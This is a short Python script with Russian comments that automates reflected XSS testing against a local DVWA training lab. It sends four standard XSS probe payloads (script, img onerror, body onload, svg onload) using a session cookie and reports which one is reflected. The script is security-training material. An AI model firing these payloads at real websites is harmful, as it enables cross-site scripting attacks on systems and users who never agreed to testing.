#!/usr/bin/env python3
import requests

# Твой PHPSESSID из браузера
PHPSESSID = "68jrank2o2bc9fiksn53l1c506"

# Создаём сессию с cookies
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)
session.cookies.set("security", "low")  # Уровень безопасности

print("╔═══════════════════════════════════════════╗")
print("║   🐉 DVWA XSS Auto Exploit               ║")
print("╚═══════════════════════════════════════════╝")

# Проверяем, работает ли сессия
print("[*] Checking session...")
response = session.get("http://localhost:8081/index.php")

if "Security Level" in response.text:
    print("[+] Session is valid!")
    
    # Тестируем XSS payload'ы
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg/onload=alert(1)>",
    ]
    
    print("[*] Testing XSS vulnerabilities...")
    
    for payload in payloads:
        print(f"    Trying: {payload[:30]}...")
        xss_response = session.get(
            "http://localhost:8081/vulnerabilities/xss_r/",
            params={"name": payload}
        )
        
        if payload in xss_response.text:
            print(f"\n[🔥] XSS FOUND! Payload: {payload}")
            print("[✓] Vulnerability successfully exploited")
            print("\n[🎉] SUCCESS! Your script works!")
            break
    else:
        print("\n[-] No XSS found. Check security level = low")
else:
    print("[-] Session invalid")
    print("[!] Make sure you:")
    print("    1. Are logged into DVWA as admin/password")
    print("    2. Copied the correct PHPSESSID")
    print("    3. Security level is set to 'low'")
